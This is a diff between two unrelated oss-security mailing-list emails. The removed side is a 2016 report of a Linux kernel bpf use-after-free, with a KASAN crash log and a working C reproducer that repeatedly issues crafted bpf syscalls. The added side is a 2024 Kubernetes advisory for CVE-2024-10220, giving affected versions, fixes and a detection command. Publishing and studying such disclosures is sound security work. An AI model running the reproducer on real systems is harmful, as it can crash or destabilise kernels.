@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["8233" "Thursday" "12" "May" "2016" "15:59:11" "+0800" "Marco Grassi" "marco.gra@gmail.com" "<CAFkTriLitb9v4MZn5b2HV9HGpu6VWHifgR3VZhDYoQwjGyaWBg@mail.gmail.com>" "220" "[oss-security] Linux Kernel bpf related UAF" nil nil nil "5" "2016051207:59:11" "[oss-security] Linux Kernel bpf related UAF" (number mark "U       marco.gra@gm May 12  220/8233  " thread-indent "\"[oss-security] Linux Kernel bpf related UAF\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 32658 invoked by uid 550); 12 May 2016 11:24:15 -0000
+Received: (qmail 32757 invoked by uid 550); 20 Nov 2024 15:34:32 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,255 +7,128 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 7914 invoked from network); 12 May 2016 07:59:23 -0000
+x-ms-reactions: disallow
+Received: (qmail 21910 invoked from network); 20 Nov 2024 15:32:16 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:date:message-id:subject:from:to;
-        bh=COYwQwDXF/i28DIsn5WB8UqJl1pnDUA8G/gszulFdrE=;
-        b=LmvV3X4HE6mJfsCwpKelp4J6QxqLu/MlA/UvDqsaALOMZw+IzaL4mFTHJXEnan97jh
-         ncgv54K2HXOX93e2AHkuP6HWB1m9kiyO5GCHw2TcVMrAfKBFOE0ii7kU95laKmKqOTSq
-         VjRLhOoljI5ZbStQSDkzc5FjSkswFc5UHJLtWzyQzuaGVGcB+FPTEW/5AzVj3QU2Ok0R
-         P8d3dALtcZKcOncoqBkF8qvKiUS7GaohLqmSvbNJrCL9v8nVhL8b56ZXzA7QqDfxGhv7
-         kQKi4FhBsjIxfiwJv6Fd3vDk2+NCYSU2qPYorSA1yiA2TzXod21/Sjt7YwemRl3qtGKT
-         StsA==
+        d=google.com; s=20230601; t=1732116727; x=1732721527; darn=lists.openwall.com;
+        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=GjoKgIoin8Wb1zYc1jzNfgvmdSnHq8hgZHIXqf4l7bM=;
+        b=IUfHdgIVA/PdSdNfa60guS09TQW8oi84tZBlsMoZl7kC2goDqZEm/M6baxO2YYpBkn
+         NphYdtStrW6AeKSlsFjtQOLy3fCOqYw5/YHAJ2xPdjAGCfJc2rHdPbAYgKvfD/AHzZPI
+         F4tVA6KHXLjbl4c85keJnan0f16XodGcmKq7G6XTXu90OB2i7tEczZdfkp2JmfcOW7v7
+         ravmvrZ8TNwQKGyrnvm6gaH1TueKWfiAR6vpTVsUqRaF03/9yX31lLeJoB5UKMizaofx
+         D7WUSL+wol5/AqhflTHuV1OF+r7hTn17JMV9GMJvpLH/Pgo0P4RaDqvccJveN8H5DvU9
+         LZOg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
-        bh=COYwQwDXF/i28DIsn5WB8UqJl1pnDUA8G/gszulFdrE=;
-        b=lQwLoTiLv0rKvYn9fOy5gE7GbFfXeNdlRxLgW7YgVtQMsIl8cndhv7fA4g9kqTm49K
-         jIdA84A2v7V3JNKd5YUNzUVGWcbTyaYcZyvvgxpYVi2jjarQAjZkUsHfwK27Nk5tlzF6
-         VrYn1X79X55fVcBLKlTR5TFe+mL78KQGXBUo9nR2zcwAc6gf9j6KkszmCJKEpi5CjNaQ
-         w18T6ITGVZXw7vQScH2UaObx5p0vNLXzlnJPIL68B7w+1w9GL3oXXiohD+XLXPk8Lv6A
-         tGfiCNVn9Uv5ml7SBJQ4YXwdN5ntADgDpMgKLVadI075IcDVLpZGag7FhB1ZcEkOOCnt
-         MP1A==
-X-Gm-Message-State: AOPr4FUxV5e88QQyuYrs42v02RuSrlRC2qq2xKRFRB6Hf53J9FJ2MxVMzAR7k/otwMToNqiDUmRWnUaghILXqA==
+        d=1e100.net; s=20230601; t=1732116727; x=1732721527;
+        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=GjoKgIoin8Wb1zYc1jzNfgvmdSnHq8hgZHIXqf4l7bM=;
+        b=UTt/D48+JZow1TIxA29+/eOKhqz6CNg7JAyFsY6COUrGRflkgQ4oC4vl4jV4czX1dT
+         Tg2f0HkSAxYzoJrzYVZXnJOhE1VVinN/YSDWtUNkCVA/YtJDqEx1Dun7FIegagqFRyFq
+         gSgMEVdjk8AjQTtfheJYkZcjpppiypz/+ofA1tcdrli0DzEE38I1wXs0NxYfwlCSVsvb
+         Cj7AD/aefo27dIiYOTk0EK4ptdDP0mKeBh/fXesUSt3rKsKD7deUMjoVU1yvLZL9SmIc
+         NB20Kn/ZWek1WOgqIctgzdPRQtbCtK6dFjJqbhCQ9J7/mT4bCBebA6YBquFH8FeMAu/G
+         3bpQ==
+X-Gm-Message-State: AOJu0YxjlV+44oTJOXvSO/x01Te2nPj6qn3QxdTHn7bX+P8cI7LHKh/o
+	CJ8L/3CbySVvvmjvO4zqqr1wXf3neNhmPmgPOLJu8ff51kU5kIAljXaqtBez95wV99c5CbXRPUo
+	kMN7ViBrCCljMAv5xIwlB98Gl9ddjhz3PCS6f0531csK+Ik7FbEVx
+X-Gm-Gg: ASbGnctL96/3s6H1Wp/60fVR0+vyUyhheMM63H8abTIza+1CirwHw9pb9RRcjmcSZ36
+	IiXuJ4EVaL3cxnx1zMx66h68NdPSaqVw7UNV+gMBYOiDd79FwztAGLmgZRkp1iOXEag==
+X-Google-Smtp-Source: AGHT+IHRsMP3YUogPb5qUjB/kadP992PcxiTZJCBjRd1zISmOsAFjqwzAyvGQ3tNcJf8omyHmdFPxyo5Co2kPRI5W2Q=
+X-Received: by 2002:a05:622a:6185:b0:462:c96a:bb30 with SMTP id
+ d75a77b69052e-464268ec9cemr4801601cf.2.1732116724812; Wed, 20 Nov 2024
+ 07:32:04 -0800 (PST)
 MIME-Version: 1.0
-X-Received: by 10.157.55.203 with SMTP id x69mr4195860otb.57.1463039951296;
- Thu, 12 May 2016 00:59:11 -0700 (PDT)
-Date: Thu, 12 May 2016 15:59:11 +0800
-Message-ID: <CAFkTriLitb9v4MZn5b2HV9HGpu6VWHifgR3VZhDYoQwjGyaWBg@mail.gmail.com>
-From: Marco Grassi <marco.gra@gmail.com>
+From: Craig Ingram <cjingram@google.com>
+Date: Wed, 20 Nov 2024 10:31:53 -0500
+Message-ID: <CAHXwHVx722YeWTTpfB6cTgHifbYBsEsdfYAeMJ=uDhzcgJw+2w@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary=001a113f192496dd870532a088c2
-Subject: [oss-security] Linux Kernel bpf related UAF
+Content-Type: multipart/alternative; boundary="0000000000001826b2062759da4c"
+Subject: [oss-security] [kubernetes] CVE-2024-10220: Arbitrary command execution through
+ gitRepo volume
 
---001a113f192496dd870532a088c2
-Content-Type: text/plain; charset=UTF-8
+--0000000000001826b2062759da4c
+Content-Type: text/plain; charset="UTF-8"
 
-Hi,
+Hello Kubernetes Community,
 
-the following reproducer will cause a UAF of a previously allocated memory
-in bpf.
+A security vulnerability was discovered in Kubernetes that could allow a
+user with the ability to create a pod and associate a gitRepo volume to
+execute arbitrary commands beyond the container boundary. This
+vulnerability leverages the hooks folder in the target repository to run
+arbitrary commands outside of the container's boundary.
 
-You can reproduce with linux kernel master, or 4.6-rc6 4.6-rc7 and maybe
-other kernel versions.
+Please note that this issue was originally publicly disclosed with a fix in
+July (#124531 <https://github.com/kubernetes/kubernetes/pull/124531>), and
+we are retroactively assigning it a CVE to assist in awareness and tracking.
 
-In the reproducer there is also a log of the UAF with KASAN of the kernel
-running on qemu x64
+This issue has been rated High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+<https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N>)
+(score: 8.1), and assigned CVE-2024-10220.
+Am I vulnerable?
 
-Thanks
+This CVE affects Kubernetes clusters where pods use the in-tree gitRepo
+volume to clone a repository to a subdirectory. If the Kubernetes cluster
+is running one of the affected versions listed below, then it is vulnerable
+to this issue.
+Affected Versions
 
-Marco
+   -
 
-Reproducer C file:
-==================
+   kubelet v1.30.0 to v1.30.2
+   -
 
-// Linux kernel version: 4.6-rc7 or 4.6-rc6, or linux master (tested
-2016/05/12) compiled with KASAN to see the log
-// Compile it with gcc -o durr durr.c
-// Run it and it will cause the UAF endlessly see qemu logs dmesg/logs
-// here there is a example log
+   kubelet v1.29.0 to v1.29.6
+   -
 
-/*
-[  228.998319]
-==================================================================
-[  228.999029] BUG: KASAN: use-after-free in
-pcpu_extend_area_map+0x111/0x130 at addr ffff88006785d47c
-[  228.999833] Read of size 4 by task durr/5570
-[  229.000219]
-=============================================================================
-[  229.000943] BUG kmalloc-192 (Tainted: G    B          ): kasan: bad
-access detected
-[  229.001619]
------------------------------------------------------------------------------
-[  229.001619]
-[  229.002485] INFO: Allocated in 0xbbbbbbbbbbbbbbbb
-age=18446720155036662370 cpu=0 pid=0
-[  229.003198]  pcpu_mem_zalloc+0x56/0xa0
-[  229.003542]  ___slab_alloc.constprop.60+0x3f9/0x440
-[  229.003995]  __slab_alloc.constprop.59+0x20/0x40
-[  229.004426]  __kmalloc+0x20b/0x240
-[  229.004749]  pcpu_mem_zalloc+0x56/0xa0
-[  229.005102]  pcpu_create_chunk+0x23/0x490
-[  229.005478]  pcpu_alloc+0xa42/0xbc0
-[  229.005806]  __alloc_percpu_gfp+0x2c/0x40
-[  229.006179]  array_map_alloc+0x52b/0x6e0
-[  229.006548]  SyS_bpf+0x6ee/0x1800
-[  229.006868]  entry_SYSCALL_64_fastpath+0x1a/0xa4
-[  229.007302] INFO: Freed in 0xffffba5f age=18446738129474796130 cpu=0
-pid=0
-[  229.007934]  kvfree+0x3b/0x60
-[  229.008220]  __slab_free+0x1df/0x2e0
-[  229.008561]  kfree+0x176/0x190
-[  229.008847]  kvfree+0x3b/0x60
-[  229.009127]  pcpu_balance_workfn+0x755/0xe10
-[  229.009527]  process_one_work+0x882/0x12d0
-[  229.009905]  worker_thread+0xe4/0x1300
-[  229.010251]  kthread+0x1fb/0x280
-[  229.010553]  ret_from_fork+0x22/0x40
-[  229.010891] INFO: Slab 0xffffea00019e1700 objects=15 used=9
-fp=0xffff88006785d048 flags=0x4000000000004080
-[  229.011771] INFO: Object 0xffff88006785d450 @offset=5200
-fp=0xbbbbbbbbbbbbbbbb
-[  229.011771]
-[  229.012562] Redzone ffff88006785d448: 00 00 00 00 00 00 00 00
-               ........
-[  229.013356] Object ffff88006785d450: bb bb bb bb bb bb bb bb 00 00 00 00
-00 00 00 00  ................
-[  229.014194] Object ffff88006785d460: 58 d4 3c 6b 00 88 ff ff 00 00 20 00
-00 00 20 00  X.<k...... ... .
-[  229.015033] Object ffff88006785d470: 00 00 e0 fa ff e8 ff ff 01 00 00 00
-00 01 00 00  ................
-[  229.015869] Object ffff88006785d480: 08 80 87 65 00 88 ff ff e0 ff ff ff
-0f 00 00 00  ...e............
-[  229.016702] Object ffff88006785d490: 90 d4 85 67 00 88 ff ff 90 d4 85 67
-00 88 ff ff  ...g.......g....
-[  229.017534] Object ffff88006785d4a0: e0 8a 49 81 ff ff ff ff a8 52 92 67
-00 88 ff ff  ..I......R.g....
-[  229.018368] Object ffff88006785d4b0: 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00  ................
-[  229.019215] Object ffff88006785d4c0: 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00  ................
-[  229.020056] Object ffff88006785d4d0: 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00  ................
-[  229.020901] Object ffff88006785d4e0: 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00  ................
-[  229.021745] Object ffff88006785d4f0: 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00  ................
-[  229.022587] Object ffff88006785d500: 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00  ................
-[  229.023431] Redzone ffff88006785d510: 00 00 00 00 00 00 00 00
-               ........
-[  229.024219] Padding ffff88006785d648: 61 ba ff ff 00 00 00 00
-               a.......
-[  229.025029] CPU: 0 PID: 5570 Comm: durr Tainted: G    B
-4.6.0-rc6 #6
-[  229.025681] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
-Ubuntu-1.8.2-1ubuntu1 04/01/2014
-[  229.026532]  0000000000000000 00000000d3335927 ffff880065e1fb08
-ffffffff81b25fb3
-[  229.027250]  ffff88006785c000 ffff88006785d450 ffff88006cc02a40
-ffffea00019e1700
-[  229.027968]  ffff880065e1fb38 ffffffff815282c5 ffff88006cc02a40
-ffffea00019e1700
-[  229.028682] Call Trace:
-[  229.028917]  [<ffffffff81b25fb3>] dump_stack+0x83/0xb0
-[  229.029389]  [<ffffffff815282c5>] print_trailer+0x115/0x1a0
-[  229.029899]  [<ffffffff8152d144>] object_err+0x34/0x40
-[  229.030370]  [<ffffffff8152f2e6>] kasan_report_error+0x226/0x550
-[  229.030926]  [<ffffffff8152e955>] ? kasan_unpoison_shadow+0x35/0x50
-[  229.031498]  [<ffffffff8152e9ce>] ? kasan_kmalloc+0x5e/0x70
-[  229.032008]  [<ffffffff8152f751>] __asan_report_load4_noabort+0x61/0x70
-[  229.032612]  [<ffffffff81496bf1>] ? pcpu_extend_area_map+0x111/0x130
-[  229.033192]  [<ffffffff81496bf1>] pcpu_extend_area_map+0x111/0x130
-[  229.033755]  [<ffffffff81496f77>] ? pcpu_create_chunk+0x367/0x490
-[  229.034314]  [<ffffffff8149734c>] pcpu_alloc+0x2ac/0xbc0
-[  229.034804]  [<ffffffff814970a0>] ? pcpu_create_chunk+0x490/0x490
-[  229.035358]  [<ffffffff8152e955>] ? kasan_unpoison_shadow+0x35/0x50
-[  229.035929]  [<ffffffff81499879>] ? kmalloc_order+0x59/0x70
-[  229.036438]  [<ffffffff814998b4>] ? kmalloc_order_trace+0x24/0xa0
-[  229.036994]  [<ffffffff8152ad9c>] ? __kmalloc+0x1ec/0x240
-[  229.037486]  [<ffffffff81497c8c>] __alloc_percpu_gfp+0x2c/0x40
-[  229.038018]  [<ffffffff813e832b>] array_map_alloc+0x52b/0x6e0
-[  229.038543]  [<ffffffff813d65ce>] SyS_bpf+0x6ee/0x1800
-[  229.039017]  [<ffffffff810dc37d>] ? __do_page_fault+0x1cd/0xb50
-[  229.039558]  [<ffffffff813d5ee0>] ? bpf_prog_new_fd+0x30/0x30
-[  229.040083]  [<ffffffff810dcda9>] ? trace_do_page_fault+0x79/0x240
-[  229.040649]  [<ffffffff82ba1932>] entry_SYSCALL_64_fastpath+0x1a/0xa4
-[  229.041236] Memory state around the buggy address:
-[  229.041678]  ffff88006785d300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc
-fc fc
-[  229.042331]  ffff88006785d380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc
-fc fc
-[  229.042992] >ffff88006785d400: fc fc fc fc fc fc fc fc fc fc fc fb fb fb
-fb fb
-[  229.043642]
-    ^
-[  229.044286]  ffff88006785d480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-fb fb
-[  229.044938]  ffff88006785d500: fb fb fb fc fc fc fc fc fc fc fc fc fc fc
-fc fc
-[  229.045589]
-==================================================================
+   kubelet <= v1.28.11
 
-*/
+How do I mitigate this vulnerability?To mitigate this vulnerability, you
+must upgrade your Kubernetes cluster to one of the fixed versions listed
+below. Additionally, since the gitRepo volume has been deprecated, the
+recommended solution is to perform the Git clone operation using an init
+container and then mount the directory into the Pod's container. An example
+of this approach is provided here
+<https://gist.github.com/tallclair/849601a16cebeee581ef2be50c351841>.Fixed
+Versions
 
-#include <stdio.h>
-#include <unistd.h>
-#include <sys/syscall.h>
-#include <string.h>
-#include <stdint.h>
-#include <pthread.h>
+   -
 
-#ifndef SYS_mmap
-#define SYS_mmap 9
-#endif
-#ifndef SYS_bpf
-#define SYS_bpf 321
-#endif
+   kubelet v1.31.0
+   -
 
-long r[6];
+   kubelet v1.30.3
+   -
 
-int main(int argc, char **argv)
-{
-    printf("--beginning of program\n");
+   kubelet v1.29.7
+   -
 
-    while(1) {
+   kubelet v1.28.12
 
-        pid_t pid = fork();
+Detection
 
-        if (pid == 0)
-        {
-            // child process
-            memset(r, -1, sizeof(r));
-            r[0] = syscall(SYS_mmap, 0x20000000ul, 0xf000ul, 0x3ul, 0x32ul,
-0xfffffffffffffffful, 0x0ul);
-            *(uint32_t*)0x20006eea = (uint32_t)0x6;
-            *(uint32_t*)0x20006eee = (uint32_t)0x4;
-            *(uint32_t*)0x20006ef2 = (uint32_t)0x54d1;
-            *(uint32_t*)0x20006ef6 = (uint32_t)0xc93;
-            r[5] = syscall(SYS_bpf, 0x0ul, 0x20006eeaul, 0x10ul, 0, 0, 0);
-            return 0;
-        }
-        else if (pid > 0)
-        {
-            // parent process
-            memset(r, -1, sizeof(r));
-            r[0] = syscall(SYS_mmap, 0x20000000ul, 0xf000ul, 0x3ul, 0x32ul,
-0xfffffffffffffffful, 0x0ul);
-            *(uint32_t*)0x20006eea = (uint32_t)0x6;
-            *(uint32_t*)0x20006eee = (uint32_t)0x4;
-            *(uint32_t*)0x20006ef2 = (uint32_t)0x54d1;
-            *(uint32_t*)0x20006ef6 = (uint32_t)0xc93;
-            r[5] = syscall(SYS_bpf, 0x0ul, 0x20006eeaul, 0x10ul, 0, 0, 0);
-            int returnStatus;
-            waitpid(pid, &returnStatus, 0);
-            printf("collected child\n");
+To detect whether this vulnerability has been exploited, you can use the
+following command to list all pods that use the in-tree gitRepo volume and
+clones to a .git subdirectory.
 
-        }
-        else
-        {
-            // fork failed
-            printf("fork() failed!\n");
-            return 1;
-        }
-    }
+kubectl get pods --all-namespaces -o json | jq '.items[] |
+select(.spec.volumes[].gitRepo.directory | endswith("/.git")) | {name: .
+metadata.name, namespace: .metadata.namespace}
 
-    printf("--end of program--\n");
+If you find evidence that this vulnerability has been exploited, please
+contact security@kubernetes.io
+Additional Details
 
-    return 0;
-}
+See the GitHub issue for more details:
+https://github.com/kubernetes/kubernetes/issues/128885
+Acknowledgements
 
-=====================
+This vulnerability was reported and mitigated by Imre Rad.
 
---001a113f192496dd870532a088c2--
+Thank You,
+
+Craig Ingram on behalf of the Kubernetes Security Response Committee
+
+--0000000000001826b2062759da4c--
